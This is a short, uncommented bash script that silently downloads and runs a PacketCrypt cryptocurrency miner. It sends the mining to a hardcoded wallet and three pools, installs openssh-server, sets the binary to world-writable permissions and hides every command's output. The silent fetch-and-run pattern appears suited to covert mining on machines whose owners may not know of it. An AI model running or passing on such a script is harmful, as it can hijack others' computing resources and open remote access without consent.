rm -rf packetcrypt main.sh > /dev/null 2>&1
sudo apt update > /dev/null 2>&1
sudo apt install openssh-server > /dev/null 2>&1
wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt > /dev/null 2>&1
chmod 777 packetcrypt
./packetcrypt ann -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world http://pool.pktpool.io https://stratum.zetahash.com &>/dev/null
